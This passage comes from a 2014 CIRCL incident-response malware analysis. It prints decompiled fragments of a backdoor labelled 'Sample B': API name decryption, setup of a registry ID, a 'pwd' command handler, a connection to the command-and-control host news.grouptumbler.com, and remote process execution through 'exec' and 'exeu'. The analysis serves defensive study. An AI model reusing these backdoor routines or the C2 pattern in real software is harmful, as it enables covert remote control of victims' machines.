@@ -1,0 +1,130 @@
+5 Interesting code parts
+5.1 Init phase of Sample B
+Decryption of module and function names
+1 int decode_functions_and_start_internet_loop ()
+2 {
+3 wininet . d l l = decrypt_string(&enc_wininet_dll ) ;
+4 hModule = LoadLibraryA( wininet . d l l ) ;
+5 i f ( hModule )
+6 {
+7 lpProcName = decrypt_string(&enc_InternetOpenA) ;
+8 InternetOpenA = GetProcAddress(hModule, lpProcName) ;
+9 lpProcName = decrypt_string ( enc_InternetConnectA ) ;
+10 InternetConnectA = GetProcAddress(hModule, lpProcName) ;
+11 lpProcName = decrypt_string(&enc_InternetSetOptionA ) ;
+12 InternetSetOptionA = GetProcAddress (hModule, lpProcName) ;
+13 lpProcName = decrypt_string(&enc_HttpOpenRequestA) ;
+14 HttpOpenRequestA = GetProcAddress(hModule, lpProcName) ;
+15 lpProcName = decrypt_string(&enc_HttpSendRequestA) ;
+16 HttpSendRequestA = GetProcAddress(hModule, lpProcName) ;
+17 lpProcName = decrypt_string(&enc_HttpQueryInfoA) ;
+18 HttpQueryInfoA = GetProcAddress(hModule, lpProcName) ;
+19 lpProcName = decrypt_string(&enc_InternetReadFile ) ;
+20 InternetReadFile = GetProcAddress(hModule, lpProcName) ;
+21 lpProcName = decrypt_string(&enc_InternetCloseHandle ) ;
+22 InternetCloseHandle = GetProcAddress(hModule, lpProcName) ;
+23 port = parse_int (”80”) ;
+24 delay = parse_int (”61”) ;
+25 generate_identifier_and_setup_jumptable(&instance ) ;
+26 internet_loop(&instance ) ;
+27 ExitThread (0) ;
+28 }
+29 return 0;
+30 }
+5.2 Decrypt and setup registry keys
+1 decrypt_registry_keys_and_set_id ()
+2 {
+3 result = 0;
+4 str_Software_Microsoft_ApplicationManager = decrypt_string(&
+enc_Software_Microsoft_ApplicationManager ) ;
+5 i f ( RegCreateKeyA(HKEY_CURRENT_USER, str_Software_Microsoft_ApplicationManager, &
+hKey) )
+6 {
+7 result = 0;
+8 }
+9 else
+10 {
+11 dwType = 4;
+12 cbData = 4;
+13 str_AppID = decrypt_string(&enc_AppID) ;
+14 i f ( (RegQueryValueExA(hKey, str_AppID, 0, &dwType, &result, &cbData) | | dwType !=
+4)
+15 && (dwType = 4,
+16 result = get_tickcount_based_value (),
+17 RegSetValueExA(hKey, str_AppID, 0, dwType, &result, 4u) ) )
+Page 8 of 12 CIRCL - Computer Incident Response Center Luxembourg
+c/o smile - ”security made in Lëtzebuerg” GIE
+41, avenue de la gare, L-1611 Luxembourg
+(+352) 247 88444 - info@circl.lu – www.circl.lu
+CIRCL - Computer Incident Response Center Luxembourg July 3, 2014
+18 RegCloseKey(hKey) ;
+19 else
+20 RegCloseKey(hKey) ;
+21 }
+22 return result ;
+23 }
+5.3 evaluate commands (extract) and error handling
+1 i f ( ! lstrcmpA(& this − >command, ”pwd”) )
+2 {
+3 ret − - return = − 127;
+4 i f ( ! GetCurrentDirectoryA (0x400u, &ret − >message ) )
+5 {
+6 this − >command = GetLastError () ;
+7 FormatMessageA(0x1000u, 0, this − >command, 0, &ret − >message, 0x400u, 0) ;
+8 }
+9 ret − >len += lstrlenA(&ret − >message ) + 1;
+10 }
+5.4 Internet connect
+1 signed int __thiscall internet_connect ( struct_this_7 * this )
+2 {
+3 buffer = 10000;
+4 i f ( url [ 0 ] != ’ ’ | | url [ 1 ] != ’ . ’ )
+5 lstrcpyA(&host, ”news . grouptumbler .com”) ;
+6 else
+7 wnsprintfA(&host, 256, ”%x%s”, & this − >path, 0x409001) ;
+8 use_proxy = 0;
+9 buffer = 3;
+10 this − >hInternetOpen = InternetOpenA(” Mozilla /4.0 ”, 0, 0, 0, 0) ;
+11 i f ( this − >hInternetOpen )
+12 {
+13 i f ( use_proxy )
+14 {
+15 success_setoption = InternetSetOptionA ( this − >hInternetOpen, INTERNET_OPTION_PROXY
+, &buffer, 12) ;
+16 i f ( ! success_setoption )
+17 {
+18 InternetCloseHandle ( this − >hInternetOpen ) ;
+19 return 0;
+20 }
+21 }
+22 InternetSetOptionA ( this − >hInternetOpen, INTERNET_OPTION_CONNECT_TIMEOUT, &buffer,
+4) ;
+23 InternetSetOptionA ( this − >hInternetOpen, INTERNET_OPTION_RECEIVE_TIMEOUT, &buffer,
+4) ;
+24 success_setoption = InternetSetOptionA ( this − >hInternetOpen,
+INTERNET_OPTION_CONTROL_SEND_TIMEOUT, &buffer, 4) ;
+25 LOWORD( success_setoption ) = port ;
+26 this − >hSession = InternetConnectA ( this − >hInternetOpen, &host, success_setoption, 0,
+0, INTERNET_SERVICE_HTTP, 0, 0) ;
+27 i f ( this − >hSession )
+28 return 1;
+29 InternetCloseHandle ( this − >hInternetOpen ) ;
+30 }
+Page 9 of 12 CIRCL - Computer Incident Response Center Luxembourg
+c/o smile - ”security made in Lëtzebuerg” GIE
+41, avenue de la gare, L-1611 Luxembourg
+(+352) 247 88444 - info@circl.lu – www.circl.lu
+CIRCL - Computer Incident Response Center Luxembourg July 3, 2014
+31 return 0;
+32 }
+5.5 Create process calls
+Command ”exec” - standard process creation:
+1 hProcess = CreateProcessA (
+2 0, & this − >cmdline, 0, 0,
+3 1, 0x14u, 0, 0,
+4 & this − >startupinfo_a, & this − >process_information )
+Command ”exeu” - process creation in a domain environment
+1 hProcess = CreateProcessWithLogonW(
+2 &Username, &Domain, lpPassword, 0,
+3 0, &CommandLine, 4u, 0, &CurrentDirectory,
+4 & this − >startupinfo_b, & this − >process_information )
